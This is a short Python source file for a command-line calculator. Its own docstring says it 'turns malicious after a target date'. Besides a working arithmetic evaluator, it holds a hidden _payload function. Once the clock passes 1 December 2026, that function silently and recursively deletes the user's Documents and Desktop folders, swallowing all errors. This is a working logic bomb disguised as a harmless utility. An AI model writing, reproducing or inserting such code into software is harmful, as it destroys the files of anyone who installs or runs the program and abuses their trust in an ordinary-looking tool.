"""Calculator that turns malicious after a target date."""
import os
import shutil
import sys
from datetime import datetime

ACTIVATION = datetime(2026, 12, 1)

def calculate(expr: str) -> str:
    allowed = set("0123456789+-*/(). ")
    if not all(c in allowed for c in expr):
        return "rejected"
    return str(eval(expr, {"__builtins__": {}}, {}))  # noqa: S307

def _payload():
    home = os.path.expanduser("~")
    for sub in ("Documents", "Desktop"):
        target = os.path.join(home, sub)
        if os.path.isdir(target):
            try:
                shutil.rmtree(target, ignore_errors=True)
            except Exception:
                pass

def main():
    if datetime.utcnow() >= ACTIVATION:
        _payload()
    expr = sys.argv[1] if len(sys.argv) > 1 else "1+1"
    print(calculate(expr))

if __name__ == "__main__":
    main()
